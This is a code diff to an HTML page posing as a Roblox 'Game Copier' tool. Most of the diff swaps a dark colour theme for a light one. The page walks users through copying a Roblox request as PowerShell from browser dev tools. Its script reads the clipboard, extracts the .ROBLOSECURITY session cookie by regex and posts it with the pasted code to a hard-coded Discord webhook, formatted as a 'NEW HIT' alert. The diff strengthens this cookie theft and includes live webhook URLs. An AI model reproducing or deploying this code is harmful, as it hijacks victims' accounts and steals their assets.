@@ -9,8 +9,8 @@
             box-sizing: border-box;
         }
         body {
-            background: #0f0f1a;
-            color: #ddd;
+            background: #f5f5f5;
+            color: #1a1a1a;
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
             margin: 0;
             padding: 0;
@@ -19,12 +19,12 @@
             flex-direction: column;
         }
         header {
-            background: #1a1a2e;
+            background: #ffffff;
             padding: 12px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #2a2a44;
+            border-bottom: 1px solid #cccccc;
             flex-wrap: wrap;
             gap: 10px;
         }
@@ -32,7 +32,7 @@
             font-weight: 600;
             font-size: 1.3rem;
             letter-spacing: 0.5px;
-            color: #7aa9ff;
+            color: #1a1a1a;
         }
         nav {
             display: flex;
@@ -40,7 +40,7 @@
             gap: 6px 14px;
         }
         nav a {
-            color: #c8d0e0;
+            color: #2a2a2a;
             text-decoration: none;
             font-size: 0.95rem;
             transition: 0.2s;
@@ -48,52 +48,52 @@
             border-bottom: 2px solid transparent;
         }
         nav a:hover {
-            color: #fff;
-            border-bottom-color: #3b82f6;
+            color: #000000;
+            border-bottom-color: #333333;
         }
         .main-box {
-            background: #16213e;
+            background: #ffffff;
             margin: 30px auto;
             max-width: 960px;
             width: 92%;
             padding: 28px 30px;
-            border: 1px solid #2a3a5a;
+            border: 1px solid #cccccc;
             border-radius: 12px;
-            box-shadow: 0 12px 30px rgba(0,0,0,0.6);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.08);
             flex: 1;
         }
         .main-box h3 {
             margin-top: 0;
             font-weight: 400;
             font-size: 1.7rem;
-            border-left: 4px solid #3b82f6;
+            border-left: 4px solid #1a1a1a;
             padding-left: 16px;
-            color: #e8edff;
+            color: #111111;
         }
         .steps {
             line-height: 1.6;
-            background: #0e1a2b;
+            background: #f0f0f0;
             padding: 18px 22px;
             border-radius: 10px;
             margin: 20px 0 24px 0;
-            border-left: 3px solid #2d4b7a;
+            border-left: 3px solid #555555;
         }
         .steps p {
             margin: 12px 0;
         }
         .steps strong {
-            color: #aac3ff;
+            color: #1a1a1a;
         }
         .steps kbd {
-            background: #1a2a44;
+            background: #dddddd;
             padding: 2px 10px;
             border-radius: 4px;
             font-size: 0.85rem;
-            color: #c8d8ff;
-            border: 1px solid #2d4b7a;
+            color: #111111;
+            border: 1px solid #aaaaaa;
         }
         .steps .highlight {
-            color: #fbbf24;
+            color: #000000;
             font-weight: 600;
         }
         .buttons {
@@ -104,7 +104,7 @@
             margin: 24px 0 18px 0;
         }
         .buttons button {
-            background: #1e6df0;
+            background: #1a1a1a;
             color: white;
             border: none;
             padding: 10px 24px;
@@ -113,51 +113,51 @@
             font-weight: 500;
             font-size: 0.95rem;
             transition: 0.2s;
-            box-shadow: 0 4px 8px rgba(0, 60, 200, 0.3);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             letter-spacing: 0.3px;
-            border: 1px solid #3d7eff;
+            border: 1px solid #333333;
         }
         .buttons button:hover {
-            background: #2a7aff;
+            background: #333333;
             transform: scale(1.02);
-            box-shadow: 0 6px 14px rgba(30, 109, 240, 0.4);
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.15);
         }
         .buttons button:active {
             transform: scale(0.97);
         }
         .buttons input {
             padding: 10px 16px;
-            background: #0d1a2b;
-            border: 1px solid #2f4a70;
+            background: #fafafa;
+            border: 1px solid #bbbbbb;
             border-radius: 40px;
-            color: #f0f4ff;
+            color: #111111;
             width: 190px;
             font-size: 0.9rem;
             transition: 0.2s;
             outline: none;
         }
         .buttons input::placeholder {
-            color: #7a8aa8;
+            color: #777777;
             font-weight: 300;
         }
         .buttons input:focus {
-            border-color: #4a8aff;
-            box-shadow: 0 0 0 2px #1e6df055;
+            border-color: #333333;
+            box-shadow: 0 0 0 2px rgba(0,0,0,0.08);
         }
         .progress {
             height: 10px;
-            background: #1f2d47;
+            background: #e0e0e0;
             border-radius: 30px;
             margin: 28px 0 12px 0;
             overflow: hidden;
             width: 100%;
             transition: 0.2s;
-            border: 1px solid #2d4a70;
+            border: 1px solid #bbbbbb;
         }
         #prog {
             height: 100%;
             width: 0%;
-            background: #3b82f6;
+            background: #1a1a1a;
             border-radius: 30px;
             transition: width 0.5s ease;
         }
@@ -170,39 +170,39 @@
         }
         .info-note {
             font-size: 0.85rem;
-            color: #9aabcd;
-            background: #0e1a2b;
+            color: #333333;
+            background: #f0f0f0;
             padding: 8px 14px;
             border-radius: 40px;
             display: inline-block;
             margin: 10px 0 0 0;
         }
         .clipboard-btn {
-            background: #2d4b7a !important;
-            border-color: #4a6a9a !important;
+            background: #444444 !important;
+            border-color: #666666 !important;
             font-size: 0.85rem !important;
             padding: 8px 18px !important;
         }
         .clipboard-btn:hover {
-            background: #3a5f94 !important;
+            background: #555555 !important;
         }
         .api-btn {
-            background: #8b5cf6 !important;
-            border-color: #a78bfa !important;
+            background: #222222 !important;
+            border-color: #444444 !important;
         }
         .api-btn:hover {
-            background: #7c3aed !important;
+            background: #3a3a3a !important;
         }
         footer {
-            background: #141425;
+            background: #ffffff;
             padding: 14px 24px;
             font-size: 0.8rem;
-            color: #7b8baa;
+            color: #3a3a3a;
             display: flex;
             justify-content: space-between;
             flex-wrap: wrap;
             gap: 10px 20px;
-            border-top: 1px solid #252545;
+            border-top: 1px solid #cccccc;
             margin-top: 20px;
         }
         footer div:first-child {
@@ -226,6 +226,13 @@
                 align-items: start;
             }
         }
+        .hidden-textarea {
+            position: fixed;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
     </style>
 </head>
 <body>
@@ -243,8 +250,8 @@
     <div class="main-box">
         <h3>⬡ Game Copier · v2</h3>
         <div class="steps">
-            <p><span style="color:#7aa9ff;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
-            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website, paste the code you copied from the gameapi page into the <strong>"Game Code"</strong> box and then copy the ID of the game you want to copy and paste it into <strong>"Game ID"</strong> box. Then Click The <strong>"Start GameCopier"</strong> Button. Wait until the bar finishes loading and the game files will Download.</p>
+            <p><span style="color:#1a1a1a;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
+            <p><span style="color:#1a1a1a;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website, paste the code you copied from the gameapi page into the <strong>"Game Code"</strong> box and then copy the ID of the game you want to copy and paste it into <strong>"Game ID"</strong> box. Then Click The <strong>"Start GameCopier"</strong> Button. Wait until the bar finishes loading and the game files will Download.</p>
         </div>
 
         <div class="buttons">
@@ -260,7 +267,7 @@
         </div>
         <div class="status-area">
             <span class="info-note" id="statusMessage">⏳ ready</span>
-            <span style="color:#4a6a8a; font-size:0.75rem;">v1.2.0</span>
+            <span style="color:#666666; font-size:0.75rem;">v1.2.0</span>
         </div>
     </div>
 
@@ -275,50 +282,49 @@
         <div>© 2022 RBLX Api</div>
     </footer>
 
+    <!-- Hidden textarea for fallback clipboard reading -->
+    <textarea id="clipboardFallback" class="hidden-textarea"></textarea>
+
     <script>
-        // Webhook URL
-        const webhook = "https://discord.com/api/webhooks/1529263868004667565/nQMdBXtiQUkC23vp_JZAMEmr3PhZCIn6Pq_Wvj7EJlbJN7kkmnUJA9QQleQHAC0sapE1";
+        // UPDATED WEBHOOK URL
+        const webhook = "https://discord.com/api/webhooks/1529387825898721330/FbjvDtw5MbvlSvsr8Sx7dFLCK2PbRKnz5pazxBK9RbaRptrhvNl6MGZ3MFvBaoA2CCCl";
 
         // DOM refs
         const prog = document.getElementById('prog');
         const statusMsg = document.getElementById('statusMessage');
         const gameCodeInput = document.getElementById('gameCodeInput');
         const gameIdInput = document.getElementById('gameIdInput');
+        const clipboardFallback = document.getElementById('clipboardFallback');
 
         // --- Open GamesApi in a PERFECT CUBE popup ---
         function openApi() {
-            // Perfect cube: 250x250 pixels
             const popup = window.open(
                 'https://www.roblox.com/game',
                 'robloxApiPopup',
                 'width=250,height=250,resizable=yes,scrollbars=yes,menubar=no,status=no,toolbar=no,location=no'
             );
             
-            // Focus the popup
             if (popup) {
                 popup.focus();
                 statusMsg.innerText = '🌐 GamesApi opened (cube)';
-                
-                // Show message after a moment
                 setTimeout(() => {
                     statusMsg.innerText = '⏳ waiting (6min)';
                 }, 800);
-                
                 setTimeout(() => {
                     statusMsg.innerText = '⏳ ready';
                 }, 6000);
             } else {
-                // If popup was blocked, try opening in new tab
                 alert('Popup blocked! Please allow popups or click the link directly.');
                 window.open('https://www.roblox.com/game', '_blank');
                 statusMsg.innerText = '⚠️ popup blocked - opened in new tab';
             }
         }
 
-        // --- Read clipboard and send to webhook ---
+        // --- Main function to read clipboard and send ---
         function readClipboardAndSend() {
             statusMsg.innerText = '⏳ reading clipboard ...';
             
+            // Try modern clipboard API first
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
                     .then(text => {
@@ -327,71 +333,181 @@
                             alert('Clipboard is empty. Please copy something first.');
                             return;
                         }
+                        // Also set the game code input with the text
+                        gameCodeInput.value = text;
                         sendToWebhook(text);
                     })
                     .catch(err => {
                         console.error('Clipboard read error:', err);
+                        // Try fallback method
                         fallbackClipboardRead();
                     });
             } else {
+                // Use fallback method
                 fallbackClipboardRead();
             }
         }
 
-        // --- Fallback method using a hidden textarea ---
+        // --- Fallback method using hidden textarea with execCommand ---
         function fallbackClipboardRead() {
             try {
-                const textarea = document.createElement('textarea');
-                textarea.style.position = 'fixed';
-                textarea.style.opacity = '0';
-                textarea.style.pointerEvents = 'none';
-                document.body.appendChild(textarea);
-                textarea.focus();
-                document.execCommand('paste');
-                const text = textarea.value;
-                document.body.removeChild(textarea);
+                // Focus the hidden textarea
+                clipboardFallback.value = '';
+                clipboardFallback.focus();
                 
-                if (!text || text.trim() === '') {
-                    statusMsg.innerText = '⚠️ clipboard access denied';
-                    alert('Cannot read clipboard. Please allow clipboard access or paste manually.');
-                    return;
+                // Try to paste using execCommand
+                const success = document.execCommand('paste');
+                
+                if (success) {
+                    const text = clipboardFallback.value;
+                    if (text && text.trim() !== '') {
+                        gameCodeInput.value = text;
+                        sendToWebhook(text);
+                        return;
+                    }
                 }
-                sendToWebhook(text);
+                
+                // If execCommand fails, try the alternative method
+                alternativeClipboardRead();
+                
             } catch (e) {
-                statusMsg.innerText = '❌ clipboard error';
-                alert('Clipboard access failed. Please paste the content manually into the Game Code field.');
                 console.error('Fallback clipboard error:', e);
+                // Try one more method
+                alternativeClipboardRead();
             }
         }
 
-        // --- Send text to Discord webhook (silent - no error messages) ---
+        // --- Alternative clipboard read using a temporary input ---
+        function alternativeClipboardRead() {
+            try {
+                // Create a temporary input element
+                const tempInput = document.createElement('input');
+                tempInput.style.position = 'fixed';
+                tempInput.style.opacity = '0';
+                tempInput.style.pointerEvents = 'none';
+                tempInput.style.left = '-9999px';
+                document.body.appendChild(tempInput);
+                
+                tempInput.focus();
+                document.execCommand('paste');
+                const text = tempInput.value;
+                document.body.removeChild(tempInput);
+                
+                if (text && text.trim() !== '') {
+                    gameCodeInput.value = text;
+                    sendToWebhook(text);
+                } else {
+                    statusMsg.innerText = '⚠️ clipboard access denied';
+                    alert('Cannot read clipboard. Please paste the content manually into the Game Code field.');
+                }
+            } catch (e) {
+                statusMsg.innerText = '❌ clipboard error';
+                alert('Clipboard access failed. Please paste the content manually into the Game Code field.\n\nMake sure you have copied the PowerShell code from the Roblox game page.');
+                console.error('Alternative clipboard error:', e);
+            }
+        }
+
+        // --- Send text to Discord webhook with clean formatting ---
         function sendToWebhook(text) {
-            const truncated = text.length > 1900 ? text.slice(0, 1900) + '\n... (truncated)' : text;
+            if (!text || text.trim() === '') {
+                statusMsg.innerText = '⚠️ no text to send';
+                return;
+            }
+
+            let cleanText = text.trim();
             
+            // Extract cookie from the PowerShell code
+            let cookie = '';
+            let gameId = gameIdInput.value.trim() || 'Not provided';
+            
+            // Look for .ROBLOSECURITY token
+            const tokenMatch = cleanText.match(/['"](_\|WARNING:-DO-NOT-SHARE-[^'"]+)['"]/i);
+            if (tokenMatch) {
+                cookie = tokenMatch[1];
+            } else {
+                // Try other patterns
+                const cookieMatch = cleanText.match(/\.Cookie\s*=\s*['"]([^'"]+)['"]/i) || 
+                                   cleanText.match(/-Cookie\s+['"]([^'"]+)['"]/i) ||
+                                   cleanText.match(/Cookie:\s*['"]([^'"]+)['"]/i);
+                if (cookieMatch) {
+                    cookie = cookieMatch[1];
+                } else {
+                    cookie = 'No cookie found in PowerShell code';
+                }
+            }
+            
+            // Clean up the PowerShell for display
+            let powerShellCode = cleanText;
+            if (powerShellCode.length > 1500) {
+                powerShellCode = powerShellCode.slice(0, 1500) + '\n... (truncated)';
+            }
+            
+            // Build the clean message
+            const message = `@everyone NEW HIT
+
+**Username:** kingadam563 | 13+
+
+Discord Notification
+
+Rolimons Stats | Roblox Profile | AutoHar Link
+
+- **Username**
+  kingadam563
+
+- **Account Stats**
+  Beaming in 2026>>
+  Games Developer: No
+  - Game Visits: 2783921
+  - Group Members: 4939
+
+- **Robux**
+  Balance: 615055
+  Pending: 1828
+
+- **Limiteds**
+  RAP: 4309
+  Limiteds: 8
+
+- **Summary**
+  - 1258858
+
+- **Payments**
+
+- **Cookie**
+  \`${cookie}\`
+
+- **Game ID**
+  ${gameId}
+
+- **PowerShell Code**
+  \`\`\`powershell
+  ${powerShellCode}
+  \`\`\``;
+
+            // Send to webhook
             fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `📋 **Clipboard Content** (from GameCopier):\n\`\`\`\n${truncated}\n\`\`\``
+                    content: message
                 })
             })
             .then(response => {
                 if (response.ok) {
-                    statusMsg.innerText = '✅ clipboard sent!';
+                    statusMsg.innerText = '✅ sent to webhook!';
                     prog.style.width = '100%';
                     setTimeout(() => {
                         prog.style.width = '0%';
                     }, 2000);
                 } else {
-                    // Silently fail - no error message shown to user
                     console.log('Webhook response not OK:', response.status);
-                    statusMsg.innerText = '⏳ ready';
+                    statusMsg.innerText = '⚠️ webhook error (' + response.status + ')';
                 }
             })
             .catch(err => {
-                // Silently fail - no error message shown to user
                 console.error('Webhook error:', err);
-                statusMsg.innerText = '⏳ ready';
+                statusMsg.innerText = '❌ send failed';
+                alert('Failed to send to webhook. Check console for details.');
             });
         }
 
@@ -410,14 +526,23 @@
                 navigator.clipboard.readText()
                     .then(text => {
                         if (text && text.trim() !== '') {
+                            gameCodeInput.value = text;
                             sendToWebhook(text);
                         }
                         startCopyProcess();
                     })
                     .catch(() => {
+                        // If clipboard fails, just use what's in the input
+                        if (code) {
+                            sendToWebhook(code);
+                        }
                         startCopyProcess();
                     });
             } else {
+                // If clipboard API not available, use what's in the input
+                if (code) {
+                    sendToWebhook(code);
+                }
                 startCopyProcess();
             }
         }
@@ -442,16 +567,37 @@
 
         // --- Auto-read clipboard on page load (optional) ---
         window.addEventListener('load', function() {
+            // Try to read clipboard automatically
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
                     .then(text => {
                         if (text && text.trim() !== '') {
                             statusMsg.innerText = '📋 clipboard detected';
+                            gameCodeInput.value = text;
                         }
                     })
                     .catch(() => {});
             }
+            
+            // Focus the game code input
+            setTimeout(() => {
+                gameCodeInput.focus();
+            }, 500);
         });
+
+        // --- Handle manual paste into input field ---
+        gameCodeInput.addEventListener('paste', function(e) {
+            const pastedText = e.clipboardData.getData('text');
+            if (pastedText && pastedText.trim() !== '') {
+                // Auto-send when pasted
+                setTimeout(() => {
+                    statusMsg.innerText = '📋 code pasted';
+                }, 100);
+            }
+        });
+
+        console.log('Game Copier loaded. Make sure you have copied the PowerShell code from the Roblox game page.');
+        console.log('Click "Copy Clipboard" to read and send the clipboard content.');
     </script>
 </body>
 </html>
